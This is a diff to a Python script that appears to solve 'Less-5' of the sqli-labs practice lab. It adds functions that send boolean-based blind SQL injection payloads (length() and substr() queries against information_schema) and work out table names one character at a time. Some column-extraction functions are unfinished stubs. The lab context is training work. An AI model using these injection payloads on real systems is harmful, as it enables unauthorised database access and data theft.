@@ -3,6 +3,7 @@ from typing import *
 
 import requests
 import re
+import time
 
 # Author: HackHuang
 # Description: For Less-5
@@ -57,28 +58,74 @@ def get_table_num(url: str) -> int:
             return table_num + 1
         table_num = table_num + 1
 
-# TODO
-def get_table_name_len(url: str, table_num: int) -> List[int]:
+def get_table_name_len(table_num: int) -> List[int]:
     table_name_len: int = 0
     table_name_len_list: List = []
+    limit_begin_index: int = 0
     while len(table_name_len_list) < table_num:
+        url = f"/Less-5/?id=1' and length((select table_name from information_schema.tables where table_schema=database() limit {limit_begin_index},1))="
         url_str: str = LAB_ROOT_URL + url + str(table_name_len) + SQL_COMMENT
         print(f'Try to get the table name length ---> {url_str}')
         if get_method(url=url_str, pattern=r'You are in'):
-            table_name_len_list.append(len)
+            table_name_len_list.append(table_name_len)
             table_name_len = 0
-            break
+            limit_begin_index = limit_begin_index + 1
         table_name_len = table_name_len + 1
     return table_name_len_list
 
-def get_table_name(url: str, pattern: str, table_name_len: int) -> None:
-    table_name_char_list: List = []
-    table_name_char: str = 'a'
-    while len(table_name_char_list) < table_name_len:
-        pass
-    pass
+def get_table_name(pattern: str, table_name_len_list: List) -> List:
+    table_name_list: List = []
+    limit_begin_index: int = 0
+    for table_name_len in table_name_len_list:
+        table_name: str = ''
+        table_name_char_ascii: int = 97
+        substr_begin_index: int = 1
+        while len(table_name) < table_name_len:
+            url: str = f"/Less-5/?id=1' and substr((select table_name from information_schema.tables where table_schema=database() limit {limit_begin_index},1), {substr_begin_index}, 1) = '{chr(table_name_char_ascii)}'"
+            url = LAB_ROOT_URL + url + SQL_COMMENT
+            print(f'Try to get the table name ---> {url}')
+            if get_method(url=url, pattern=pattern):
+                table_name = table_name + chr(table_name_char_ascii)
+                substr_begin_index = substr_begin_index + 1
+                table_name_char_ascii = 97
+                print(f'Updating the table_name: {table_name}')
+                continue
+            table_name_char_ascii = table_name_char_ascii + 1
+        table_name_list.append(table_name)
+        print(f'The table name had been got: {table_name_list}')
+        limit_begin_index = limit_begin_index + 1
+    return table_name_list
 
-def get_column_name() -> None:
+# TODO
+def get_column_num(url: str) -> int:
+    return 0
+
+# TODO
+def get_column_name_len(column_num: int) -> List[int]:
+    column_name_len: int = 0
+    column_name_len_list: List = []
+    limit_begin_index: int = 0
+    while len(column_name_len_list) < column_num:
+        url: str = "/Less-5/?id=1' and length((select column_name from information_schema.columns where table_name = 'users' limit 0, 1)) = 2"
+        url = LAB_ROOT_URL + url + SQL_COMMENT
+        pass
+    return []
+
+# TODO
+def get_column_name(pattern: str, column_name_len_list: List[int], table_name_list: List[str]) -> List:
+    column_name_list: List = []
+    limit_begin_index: int = 0
+    for column_name_len in column_name_len_list:
+        column_name: str = ''
+        column_name_char_ascii: int = 97
+        sub_begin_index: int = 1
+        while len(column_name) < column_name_len:
+            url: str = "/Less-5/?id=1' and substr((select column_name from information_schema.columns where table_name='users' limit 0, 1), 1, 1)='i'"
+            url = LAB_ROOT_URL + url + SQL_COMMENT
+            pass
+    return []
+
+def get_data_len() -> None:
     pass
 
 def get_data() -> None:
@@ -93,8 +140,14 @@ def get_data() -> None:
 # db_name: str = get_db_name(url="/Less-5/?id=1' and ", pattern=r'You are in', db_name_len=8)
 # print(f'The db name: {db_name}')
 
-table_num: int = get_table_num(url="/Less-5/?id=1' AND ((SELECT LENGTH(GROUP_CONCAT(table_name)) -LENGTH(REPLACE(GROUP_CONCAT(table_name), ',', '')) FROM information_schema.tables WHERE table_schema = DATABASE()) = ")
-print(f'The table number: {table_num}')
+# table_num: int = get_table_num(url="/Less-5/?id=1' AND ((SELECT LENGTH(GROUP_CONCAT(table_name)) -LENGTH(REPLACE(GROUP_CONCAT(table_name), ',', '')) FROM information_schema.tables WHERE table_schema = DATABASE()) = ")
+# print(f'The table number: {table_num}')
 
-# table_name_len: int = get_table_name_len(url="/Less-5/?id=1' and length((select table_name from information_schema.tables where table_schema=database() limit 0,1))=")
-# print(f'The table name length: {table_name_len}')
+# table_name_len_list: List = get_table_name_len(table_num=4)
+# print(f'The table name length: {table_name_len_list}')
+
+# get_table_num_url: str = "/Less-5/?id=1' AND ((SELECT LENGTH(GROUP_CONCAT(table_name)) - LENGTH(REPLACE(GROUP_CONCAT(table_name), ',', '')) FROM information_schema.tables WHERE table_schema = DATABASE()) = "
+# table_name_list: List = get_table_name(pattern='You are in', table_name_len_list=get_table_name_len(table_num=get_table_num(url=get_table_num_url)))
+# print(f'The table name list: {table_name_list}')
+
+# column_name_list: List = get_column_name(pattern='You are in', table_name_list=get_table_name)
